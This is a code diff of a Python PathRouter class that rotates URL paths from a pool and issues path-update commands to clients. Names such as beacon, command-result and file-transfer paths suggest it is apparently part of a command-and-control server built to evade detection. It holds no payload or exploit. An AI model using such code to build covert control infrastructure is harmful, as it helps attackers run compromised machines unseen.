@@ -1,73 +1,53 @@
 import json
 import logging
 import datetime
+import random
 
 logger = logging.getLogger(__name__)
 
 class PathRouter:
-    """Manages URL path routing and rotation with modular path support"""
+    """Manages URL path routing and rotation with pool-based path approach"""
     
     def __init__(self, path_manager):
         self.path_manager = path_manager
         self.path_mapping = {}
         self.update_path_mapping()
-        logger.info("PathRouter initialized with path manager")
+        logger.info("PathRouter initialized with pool-only path manager")
     
     def update_path_mapping(self):
-        """Update path mapping after rotation to include all paths in the pool"""
+        """Update path mapping after rotation to map all paths in the pool"""
         self.path_mapping = {}
         
-        # Add current paths to mapping
+        # Get current paths
         current_paths = self.path_manager.get_current_paths()
         
         # Log all available paths to help with debugging
         logger.debug(f"Current available paths: {current_paths}")
         
-        # Map specific operation paths - make sure file_request_path is properly mapped
-        for key, path in current_paths.items():
-            if key != "path_pool":  # Skip the path_pool itself
-                self.path_mapping[path] = key
-                # Log the mapping for debugging
-                logger.debug(f"Mapped {path} to {key}")
-        
-        # IMPORTANT: Verify file_request_path is definitely in the mapping
-        if "file_request_path" in current_paths:
-            file_req_path = current_paths["file_request_path"]
-            self.path_mapping[file_req_path] = "file_request_path"
-            logger.info(f"Explicitly mapped file request path: {file_req_path} -> file_request_path")
-        
-        # Map all paths in the pool to appropriate types based on pattern matching
+        # Map all paths in the pool to 'pool_path' type
         if "path_pool" in current_paths and isinstance(current_paths["path_pool"], list):
             for path in current_paths["path_pool"]:
-                if path not in self.path_mapping:  # Don't overwrite specific mappings
-                    # Look for path patterns that suggest file operations
-                    if "/file/" in path or "/download/" in path or "/content/" in path:
-                        self.path_mapping[path] = "file_request_path"
-                        logger.debug(f"Mapped pool path {path} to file_request_path based on pattern")
-                    else:
-                        self.path_mapping[path] = "pool_path"
-                        logger.debug(f"Mapped pool path {path} to pool_path type")
+                # Look for path patterns to identify different operation types
+                if "/file/" in path or "/download/" in path or "/content/" in path:
+                    self.path_mapping[path] = "file_operation_path"
+                    logger.debug(f"Mapped pool path {path} to file_operation_path based on pattern")
+                else:
+                    self.path_mapping[path] = "pool_path"
+                    logger.debug(f"Mapped pool path {path} to pool_path type")
         
         # Also add previous rotation's paths for graceful transition
         if self.path_manager.rotation_counter > 0:
             previous_paths = self.path_manager.get_path_by_rotation_id(self.path_manager.rotation_counter - 1)
-            if previous_paths:
-                for key, path in previous_paths.items():
-                    if key != "path_pool" and path not in self.path_mapping:  # Don't overwrite current paths
-                        self.path_mapping[path] = f"previous_{key}"
-                        logger.debug(f"Mapped previous path {path} to previous_{key}")
-                
-                # Also map previous path pool
-                if "path_pool" in previous_paths and isinstance(previous_paths["path_pool"], list):
-                    for path in previous_paths["path_pool"]:
-                        if path not in self.path_mapping:  # Don't overwrite current mappings
-                            # Look for file patterns in previous pool paths too
-                            if "/file/" in path or "/download/" in path or "/content/" in path:
-                                self.path_mapping[path] = "previous_file_request_path"
-                                logger.debug(f"Mapped previous pool path {path} to previous_file_request_path based on pattern")
-                            else:
-                                self.path_mapping[path] = "previous_pool_path"
-                                logger.debug(f"Mapped previous pool path {path} to previous_pool_path type")
+            if previous_paths and "path_pool" in previous_paths:
+                for path in previous_paths["path_pool"]:
+                    if path not in self.path_mapping:  # Don't overwrite current mappings
+                        # Look for file patterns in previous pool paths too
+                        if "/file/" in path or "/download/" in path or "/content/" in path:
+                            self.path_mapping[path] = "previous_file_operation_path"
+                            logger.debug(f"Mapped previous pool path {path} to previous_file_operation_path")
+                        else:
+                            self.path_mapping[path] = "previous_pool_path"
+                            logger.debug(f"Mapped previous pool path {path} to previous_pool_path")
     
     def check_rotation(self):
         """Check if rotation is needed and update mapping if it is"""
@@ -89,10 +69,9 @@ class PathRouter:
             return endpoint_type
         
         # Special handling for dynamic paths that might be for file operations
-        # This helps with paths established on-the-go without dedicated registration
         if "/file/" in path or "/download/" in path or "/content/" in path:
-            logger.info(f"Path {path} looks like a file operation path, treating as file_request_path")
-            return "file_request_path"
+            logger.info(f"Path {path} looks like a file operation path")
+            return "file_operation_path"
         
         # If not found, check for partial matches (useful for dynamic subpaths)
         for mapped_path, endpoint_type in self.path_mapping.items():
@@ -104,20 +83,13 @@ class PathRouter:
         # If not found, check older rotations
         for rotation_id in range(max(0, self.path_manager.rotation_counter - 5), self.path_manager.rotation_counter):
             paths = self.path_manager.get_path_by_rotation_id(rotation_id)
-            if paths:
-                # Check specific paths
-                for key, old_path in paths.items():
-                    if key != "path_pool" and old_path == path:
-                        logger.debug(f"Found in rotation {rotation_id}: {path} -> old_{key}")
-                        return f"old_{key}"
-                
-                # Check path pool
-                if "path_pool" in paths and isinstance(paths["path_pool"], list):
-                    if path in paths["path_pool"]:
+            if paths and "path_pool" in paths:
+                for old_path in paths["path_pool"]:
+                    if old_path == path:
                         # Check for file patterns in old pool paths
                         if "/file/" in path or "/download/" in path or "/content/" in path:
-                            logger.debug(f"Found in rotation {rotation_id} pool: {path} -> old_file_request_path")
-                            return "old_file_request_path"
+                            logger.debug(f"Found in rotation {rotation_id} pool: {path} -> old_file_operation_path")
+                            return "old_file_operation_path"
                         else:
                             logger.debug(f"Found in rotation {rotation_id} pool: {path} -> old_pool_path")
                             return "old_pool_path"
@@ -136,6 +108,24 @@ class PathRouter:
         """Get the current active paths"""
         return self.path_manager.get_current_paths()
     
+    def get_random_path(self, for_file_operation=False):
+        """Get a random path from the pool, optionally for a file operation"""
+        current_paths = self.path_manager.get_current_paths()
+        if "path_pool" in current_paths and current_paths["path_pool"]:
+            pool = current_paths["path_pool"]
+            
+            if for_file_operation:
+                # Try to find paths that look like file operations
+                file_paths = [p for p in pool if "/file/" in p or "/download/" in p or "/content/" in p]
+                if file_paths:
+                    return random.choice(file_paths)
+            
+            # Return a random path from the pool
+            return random.choice(pool)
+        
+        # Fallback to a generic path if pool is empty
+        return "/api/endpoint"
+    
     def get_rotation_info(self):
         """Get information about the current rotation state"""
         return self.path_manager.get_rotation_info()
@@ -144,17 +134,8 @@ class PathRouter:
         """Create a command to update client with new path rotation info"""
         rotation_info = self.path_manager.get_rotation_info()
         
-        # Create a simplified dictionary with paths needed
-        paths_dict = {
-            "beacon_path": rotation_info["current_paths"]["beacon_path"],
-            "cmd_result_path": rotation_info["current_paths"]["cmd_result_path"],
-            "file_request_path": rotation_info["current_paths"]["file_request_path"],
-            "file_upload_path": rotation_info["current_paths"]["file_upload_path"]
-        }
-        
-        # Add the full path pool if available
-        if "path_pool" in rotation_info["current_paths"]:
-            paths_dict["path_pool"] = rotation_info["current_paths"]["path_pool"]
+        # Only include the path pool in the command
+        paths_dict = {"path_pool": rotation_info["current_paths"]["path_pool"]}
         
         return {
             "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
